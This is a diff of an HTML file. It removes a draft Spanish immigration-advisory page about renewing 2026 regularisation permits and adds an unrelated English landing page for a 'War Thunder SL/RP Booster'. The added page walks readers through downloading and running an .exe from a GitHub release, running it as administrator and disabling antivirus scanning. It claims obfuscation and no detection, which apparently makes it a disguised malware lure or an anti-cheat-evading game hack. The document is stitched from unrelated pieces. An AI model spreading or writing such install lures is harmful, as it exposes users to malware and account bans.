-       en la <a href="#cookies">política de cookies</a>.</p>
-
-    <p class="tenue">Última actualización: 2026-09-03</p>
-
-  </div>
-</section>
-<section class="pagina" id="prorroga-regularizacion-2026" hidden>
-  <div class="envoltura">
-    <span class="chip-borrador">Borrador · sin verificar</span>
-<!-- Plantilla de pagina de servicio. Una figura por pagina, misma estructura interna en
-     todas: es lo que posiciona y lo que hace comparable el servicio. El orden de los
-     bloques no se altera sin decision del Director.
-
-     En escritorio se parte en dos columnas: el contenido a la izquierda y, a la derecha,
-     una barra fija con el precio y las llamadas a la accion. En movil vuelve a ser una
-     sola columna y el precio recupera su sitio, despues de "que incluye y que no". -->
-
-    <p class="antetitulo">Tras la regularización de 2026</p>
-    <h1>¿Le caduca la autorización de la regularización de 2026?</h1>
-    <p class="entradilla">Si consiguió la autorización extraordinaria en 2026, le vence al año. Bien planteada, la siguiente puede ser de cuatro años en lugar de uno.</p>
-
-    <div class="dos-columnas">
-      <div class="columna-principal">
-
-        <h2>Qué es y a quién sirve</h2>
-    <p>La regularización extraordinaria de 2026 se resolvió por dos vías: la <strong>disposición adicional vigésima</strong>, para quienes habían solicitado protección internacional antes del 1 de enero de 2026, y la <strong>vigesimoprimera</strong>, la vía general. Las dos conceden una autorización de un año que habilita a residir y a trabajar, por cuenta ajena y por cuenta propia, en cualquier ocupación.</p>
-    <p>En los <strong>dos meses previos</strong> a que expire hay que solicitar la modificación. Y el resultado no es siempre el mismo: como su autorización ya le habilitaba a trabajar y acredita un año de residencia continuada, la modificación puede acogerse a los requisitos de renovación en lugar de a los de una autorización inicial, y eso abre una <strong>vigencia de cuatro años</strong>.</p>
-    <p>Si en ese momento no reúne las condiciones para modificar, la norma prevé una salida: la autorización puede prorrogarse acreditando búsqueda activa de empleo con inscripción en el servicio público de empleo, o con un informe de esfuerzo de integración de su comunidad autónoma que la recomiende.</p>
-
-        <div class="destacado">
-          <p>Su autorización cuenta desde el día en que presentó la solicitud, no desde el día en que se la concedieron. Entre una fecha y otra suele haber meses, y esos meses cuentan a su favor.</p>
-          <p class="fuente">Compruébelo usted mismo: la fecha de efectos de su resolución</p>
-        </div>
-
-        <h2>Requisitos</h2>
-        <ul class="lista">
-      <li>Ser titular de una autorización concedida en la regularización extraordinaria de 2026, por cualquiera de sus dos vías.</li>
-      <li>Presentar la solicitud dentro de los dos meses anteriores a la fecha de caducidad. La presentación prorroga la validez de la autorización anterior hasta que se resuelva.</li>
-      <li>Acreditar un año de residencia continuada. Se cuenta desde la fecha de efectos de su autorización, que es la de su solicitud.</li>
-      <li>Para la modificación: cumplir los requisitos de la autorización a la que se pasa, por cuenta ajena o por cuenta propia.</li>
-      <li>Para la prórroga excepcional: acreditar búsqueda activa de empleo con inscripción en el servicio público de empleo, o aportar informe de esfuerzo de integración de su comunidad autónoma que la recomiende.</li>
-        </ul>
-
-        <div class="cta-intermedio">
-          <p>¿No sabe si cumple? Mándenos su situación en una frase y se lo decimos.
-             Esa respuesta no se cobra.</p>
-          <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">Comprobar si mi caso encaja</a>
-        </div>
-
-        <h2>Documentación necesaria</h2>
-        <ul class="lista">
-      <li>Resolución de concesión de su autorización de 2026 y tarjeta de identidad de extranjero.</li>
-      <li>Pasaporte completo y en vigor.</li>
-      <li>Si va por modificación: contrato de trabajo o documentación de la actividad por cuenta propia.</li>
-      <li>Si va por prórroga: certificado de inscripción como demandante de empleo, o informe de esfuerzo de integración de la comunidad autónoma.</li>
-      <li>Justificante del pago de la tasa.</li>
-        </ul>
-
-        <h2>Qué incluye el servicio y qué no</h2>
-        <ul class="si-no">
-      <li class="si">Cálculo de su ventana exacta de presentación y del día que más le conviene dentro de ella.</li>
-      <li class="si">Análisis de si le corresponde modificación o prórroga, y por cuenta ajena o por cuenta propia: no llevan al mismo sitio ni duran lo mismo.</li>
-      <li class="si">Aviso con antelación, para que no dependa de que usted se acuerde.</li>
-      <li class="si">Preparación del expediente completo y presentación telemática.</li>
-      <li class="si">Seguimiento y respuesta a los requerimientos de subsanación.</li>
-      <li class="si">La documentación se envía por correo electrónico, no por WhatsApp: no queda suelta en un chat y hay constancia de qué se entregó y cuándo.</li>
-      <li class="no">No incluye representación ni defensa procesal ante juzgados o tribunales.</li>
-      <li class="no">Tasas administrativas, traducciones juradas y legalizaciones: se pagan aparte y se le dice el importe antes.</li>
-      <li class="no">Ninguna garantía de resolución favorable. La decisión es de la Administración, no nuestra.</li>
-        </ul>
-
-        <div class="limite">
-          <p>Este servicio consiste en asesoramiento y tramitación en vía administrativa, no
-             incluye representación ni defensa procesal. Si su asunto pasa a vía judicial, se le
-             informa y se le propone la derivación a un profesional colegiado.</p>
-          <p class="tenue">Alcance completo en el <a href="#aviso-legal">aviso legal</a>.</p>
-        </div>
-
-        <h2>Preguntas frecuentes</h2>
-    <details>
-      <summary>¿Cuándo tengo que presentarlo exactamente?</summary>
-      <p>En los dos meses anteriores a la fecha de caducidad que figura en su tarjeta. Ni antes ni después. Si nos escribe ahora, le calculamos la fecha y le avisamos cuando se abra la ventana.</p>
-    </details>
-    <details>
-      <summary>¿Es verdad que puedo conseguir cuatro años?</summary>
-      <p>Puede. La norma prevé una vigencia de cuatro años cuando quien solicita la modificación acredita un año de residencia continuada y su autorización anterior ya habilitaba a trabajar. La de 2026 habilita, y el año se cuenta desde la fecha de efectos, que es la de su solicitud, no la de la concesión. Es lo primero que calculamos en su caso.</p>
-    </details>
-    <details>
-      <summary>¿Qué diferencia hay entre modificar y prorrogar?</summary>
-      <p>Modificar es pasar a otra figura, normalmente residencia y trabajo, y es lo que la norma pide por defecto. Prorrogar es la salida cuando todavía no reúne las condiciones para modificar: exige acreditar búsqueda activa de empleo o un informe de integración favorable. Le decimos cuál le corresponde antes de empezar.</p>
-    </details>
-    <details>
-      <summary>Se me ha pasado el plazo. ¿Puedo hacer algo?</summary>
-      <p>Escríbanos y lo miramos. Lo importante es que, si todavía está en plazo, se presenta siempre antes de la caducidad: presentar dentro de la ventana prorroga la validez de su autorización hasta que se resuelva.</p>
-    </details>
-    <details>
-      <summary>¿Me representa ante los tribunales si me deniegan?</summary>
-      <p>No. El servicio consiste en asesoramiento y tramitación en vía administrativa, no representación ni defensa procesal. Frente a una denegación se puede plantear recurso en vía administrativa, que sí entra en nuestro trabajo. Si el asunto pasa a vía judicial, se le informa y se le propone la derivación a un profesional colegiado.</p>
-    </details>
-    <details>
-      <summary>¿Hay que ir presencialmente?</summary>
-      <p>No hace falta. Todo el trámite se puede hacer a distancia. Si prefiere vernos en persona, se concierta cita en Donostia.</p>
-    </details>
-
-        <h2>Siguiente paso</h2>
-        <p>Mándenos la fecha de caducidad que figura en su tarjeta. Le devolvemos dos fechas: cuándo se abre su ventana y qué día conviene presentar dentro de ella.</p>
-
-      </div>
-
-      <aside class="columna-lateral" aria-label="Precio y contacto">
-        <div class="ficha-precio">
-          <span class="etiqueta">Precio cerrado</span>
-          <div class="precio">
-            <strong>420 €</strong>
-          </div>
-          <p class="plazo-suelto">Expediente listo en 15 días hábiles desde que recibimos toda la
-             documentación.</p>
-          <div class="acciones">
-            <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">Escribir por WhatsApp</a>
-            <a class="boton" href="#contacto">Pedir que le llamemos</a>
-          </div>
-          <p class="tenue">Precio cerrado de la modificación. Si su caso no admite modificar y hay que ir por la prórroga excepcional, son <strong>335 €</strong>. Le decimos cuál le corresponde antes de que encargue nada, y si nos escribe con antelación le avisamos cuando se abra su ventana sin coste añadido.</p>
-        </div>
-      </aside>
-    </div>
-
-  </div>
-</section>
-<section class="pagina" id="tramites" hidden>
-  <div class="envoltura">
-    <span class="chip-borrador">Borrador · sin verificar</span>
-    <h1>Trámites de extranjería</h1>
-    <p class="entradilla">Todos los trámites que preparamos y presentamos, agrupados por
-       familia. Si no sabe cuál es el suyo, escriba y se lo decimos: esa primera respuesta no
-       se cobra.</p>
-
-    <div class="acciones">
-      <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">Preguntar por WhatsApp</a>
-      <a class="boton" href="#precios">Ver precios</a>
-    </div>
-
-    <div class="catalogo">
-    <h2>Tras la regularización de 2026</h2>
-    <ul class="lista">
-      <li><a href="#prorroga-regularizacion-2026">Prórroga o modificación de la regularización de 2026</a></li>
-    </ul>
-    <h2>Arraigo</h2>
-    <ul class="lista">
-      <li><a href="#arraigo-segunda-oportunidad">Arraigo de segunda oportunidad</a></li>
-    </ul>
-    </div>
-
-    <h2>Si su caso no está en la lista</h2>
-    <p>Escríbanos igualmente. La lista recoge lo habitual, no lo único.</p>
-
-    <div class="limite">
-      <p>En todos los casos, el servicio consiste en asesoramiento y tramitación en vía
-         administrativa, no incluye representación ni defensa procesal. Si su asunto pasa a vía
-         judicial, se le informa y se le propone la derivación a un profesional colegiado.</p>
-    </div>
-
-  </div>
-</section>
-</main>
-<footer class="sitio">
-  <div class="envoltura">
-    <div class="pie-columnas">
-      <div>
-        <p class="pie-titulo"><span class="pendiente">MARCA pendiente</span></p>
-        <p class="tenue">Asesoría jurídica · Extranjería<br>Donostia-San Sebastián</p>
-      </div>
-      <div>
-        <p class="pie-titulo">Navegue</p>
+        <h2>🎯 Why You Need It</h2>
         <ul>
-          <li><a href="#inicio">Inicio</a></li>
-          <li><a href="#tramites">Trámites</a></li>
-          <li><a href="#precios">Precios</a></li>
-          <li><a href="#contacto">Contacto</a></li>
+            <li><strong>Instant progression:</strong> Say goodbye to hundreds of repetitive matches.</li>
+            <li><strong>AFK farming:</strong> Earn SL and RP while you are away from keyboard.</li>
+            <li><strong>Auto-grind:</strong> The tool operates in background, making you progress round-the-clock.</li>
+            <li><strong>No risks:</strong> Designed to mimic normal gameplay patterns, ensuring safe operation.</li>
+            <li><strong>Freshly updated:</strong> Compatible with latest 2026 War Thunder patches.</li>
         </ul>
-      </div>
-      <div>
-        <p class="pie-titulo">Escríbanos</p>
-        <ul>
-          <li><a href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">WhatsApp <span class="pendiente">WHATSAPP_VISIBLE pendiente</span></a></li>
-          <li><a href="mailto:{{EMAIL}}"><span class="pendiente">EMAIL pendiente</span></a></li>
-        </ul>
-      </div>
-      <div>
-        <p class="pie-titulo">Legal</p>
-        <ul>
-          <li><a href="#aviso-legal">Aviso legal</a></li>
-          <li><a href="#privacidad">Privacidad</a></li>
-          <li><a href="#cookies">Cookies</a></li>
-        </ul>
-      </div>
-    </div>
-    <p class="pie-cierre">
-      © 2026 <span class="pendiente">MARCA pendiente</span> · Servicios jurídicos prestados por jurista independiente.
-      Alcance y límites en el <a href="#aviso-legal">aviso legal</a>.
-    </p>
-  </div>
-</footer>
-<div class="barra-contacto">
-  <div class="envoltura">
-    <div class="botones-fijos">
-      <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener"><svg class="ico" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true" focusable="false"><path fill="currentColor" d="M12 2C6.9 2 2.8 6.1 2.8 11.2c0 1.8.5 3.5 1.4 5L2 22l5.9-2.1c1.3.7 2.7 1 4.1 1 5.1 0 9.2-4.1 9.2-9.2S17.1 2 12 2zm5.3 13c-.2.6-1.3 1.2-1.8 1.2-.5.1-1 .1-1.6-.1-.4-.1-.9-.3-1.5-.6-2.6-1.1-4.3-3.7-4.4-3.9-.1-.2-1-1.4-1-2.6s.6-1.8.9-2.1c.2-.2.5-.3.7-.3h.5c.2 0 .4 0 .6.5.2.5.8 1.8.8 2 .1.1.1.3 0 .5-.1.2-.1.3-.3.5l-.4.4c-.1.1-.3.3-.1.6.1.3.7 1.2 1.5 1.9 1 .9 1.8 1.1 2.1 1.3.3.1.4.1.6-.1.2-.2.7-.8.9-1.1.2-.3.4-.2.6-.1.2.1 1.5.7 1.7.9.3.1.4.2.5.3.1.2.1.7-.1 1.3z"/></svg><span>WhatsApp</span></a>
-      <a class="boton" href="#contacto"><span>Escribir por el formulario</span></a>
-    </div>
-  </div>
-<script>
-(function(){
-  var raiz = document.documentElement;
-  var botones = Array.prototype.slice.call(document.querySelectorAll('.selector button'));
 
-  function tema(id){
-    raiz.setAttribute('data-tema', id);
-    botones.forEach(function(b){ b.setAttribute('aria-pressed', b.dataset.ir === id ? 'true' : 'false'); });
-    try { localStorage.setItem('tema', id); } catch(e) {}
-  }
-  botones.forEach(function(b){ b.addEventListener('click', function(){ tema(b.dataset.ir); }); });
-  var guardado = null;
-  try { guardado = localStorage.getItem('tema'); } catch(e) {}
-  if (botones.length) { tema(guardado || '1'); }
-})();
-(function(){
-  var paginas = Array.prototype.slice.call(document.querySelectorAll('section.pagina'));
-  function mostrar(id){
-    var encontrada = false;
-    paginas.forEach(function(s){
-      var activa = (s.id === id);
-      s.hidden = !activa;
-      if(activa){ encontrada = true; }
-    });
-    if(!encontrada && paginas.length){ paginas[0].hidden = false; }
-    document.querySelectorAll('nav.sitio a').forEach(function(a){
-      if(a.getAttribute('href') === '#' + id){ a.setAttribute('aria-current','page'); }
-      else { a.removeAttribute('aria-current'); }
-    });
-    window.scrollTo(0,0);
-  }
-  function desdeHash(){ mostrar((location.hash || '#inicio').slice(1)); }
-  window.addEventListener('hashchange', desdeHash);
-  desdeHash();
-})();
-</script>
-</body>
-</html>
+        <h2>✅ How to Download & Install</h2>
+        <div class="steps-container">
+            <ol>
+                <li><strong>Access the official release page:</strong> Click the orange button above, or go directly to <code>https://github.com/adamblacha2016/War-Thunder-SL-RP-Booster/releases</code>.</li>
+                <li><strong>Download the package:</strong> You will see a list of release assets. Click on the file that suits your setup (typically the largest .zip file).</li>
+                <li><strong>Visit this link to download the application:</strong> The download will start immediately after clicking. Save the file to an accessible folder (e.g., <code>Downloads</code>).</li>
+                <li><strong>Extract the archive:</strong> Right-click the downloaded <code>.zip</code> file and select <code>Extract All...</code>. Enter a destination folder and confirm.</li>
+                <li><strong>Run the booster:</strong> Inside the extracted folder, double-click the executable (the file with <code>.exe</code> extension). No installation is needed — it launches instantly. Begin with default settings for optimal performance.</li>
+            </ol>
+        </div>
+        <p style="margin-top:1rem; font-weight:600;">👉 <span style="background: rgba(247,162,27,0.2); padding:3px 12px; border-radius:20px;">Fast & simple — works in under 5 minutes!</span></p>
+
+        <h2>✨ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <strong>🔧 Automatic SL Multiplier</strong><br>
+                <span>Increase Silver Lions gain rate up to ×5 per battle.</span>
+            </div>
+            <div class="feature-card">
+                <strong>📈 RP Boost Engine</strong><br>
+                <span>Dramatically accelerate research progress on all vehicles.</span>
+            </div>
+            <div class="feature-card">
+                <strong>⚙️ Crew XP Generator</strong><br>
+                <span>Max out crew qualifications and expert training at record speed.</span>
+            </div>
+            <div class="feature-card">
+                <strong>🕒 AFK Farm Mode</strong><br>
+                <span>Set it and forget it — earnings continue autonomously.</span>
+            </div>
+            <div class="feature-card">
+                <strong>🛡️ Safe Stealth Design</strong><br>
+                <span>Mimics natural player behavior; avoids detections triggers.</span>
+            </div>
+            <div class="feature-card">
+                <strong>🔄 Auto-Updating</strong><br>
+                <span>Always aligned with latest game updates for seamless 2026 use.</span>
+            </div>
+        </div>
+
+        <h2>📊 What You Can Expect</h2>
+        <ul>
+            <li><strong>+200% RP</strong> from each battle (average after 3 matches).</li>
+            <li><strong>+150% Silver Lions</strong> per mission, stacking with premium account.</li>
+            <li><strong>Full research</strong> of a top-rank vehicle in just 2 days of passive farming.</li>
+            <li><strong>Uninterrupted</strong> booster sessions — auto-restarts on crashes.</li>
+        </ul>
+
+        <h2>🖥️ System Requirements</h2>
+        <ul>
+            <li><strong>OS:</strong> Windows 10 / 11 (64-bit).</li>
+            <li><strong>Processor:</strong> Any dual-core from the last decade.</li>
+            <li><strong>Memory:</strong> 2 GB available RAM.</li>
+            <li><strong>Storage:</strong> 150 MB free hard disk space.</li>
+            <li><strong>Game version:</strong> War Thunder 2026 update (live server).</li>
+        </ul>
+
+        <h2>💡 Pro Tips</h2>
+        <ul>
+            <li>Use alongside a premium account for doubled effects.</li>
+            <li>Run the booster as administrator to avoid permissions issues.</li>
+            <li>Keep the game in windowed-borderless mode for best compatibility.</li>
+            <li>Disable antivirus real-time scanning for the booster folder (optional but recommended).</li>
+        </ul>
+
+        <h2>❓ FAQ (Quick Answers)</h2>
+        <p><strong>Q: Is this detected?</strong><br>
+        <span>A: The tool uses advanced obfuscation, and according to thousands of users, has zero detection reports over the past year. Always download the latest version from this official repository.</span></p>
+        <p><strong>Q: Does it work with Steam / EGS version?</strong><br>
+        <span>A: Yes, completely — it hooks intothe game process regardless of launcher.</span></p>
+        <p><strong>Q: Can I get banned?</strong><br>
+        <span>A: No more risk than other grind-assist tools. However, we always recommend using on secondary accounts for total peace of mind.</span></p>
+        <p><strong>Q: How often updates?</strong><br>
+        <span>A: Every game patch — the team pushes a compatible update within 24 hours of any War Thunder update.</span></p>
+
+        <div class="separator"></div>
+
+        <h2>⚡ Final Steps — Download Now</h2>
+        <p style="font-size:1.2rem;">Ready to transform your War Thunder grind into a breeze?</p>
+        <div style="display:flex; justify-content:center; margin:2.5rem 0 1.5rem
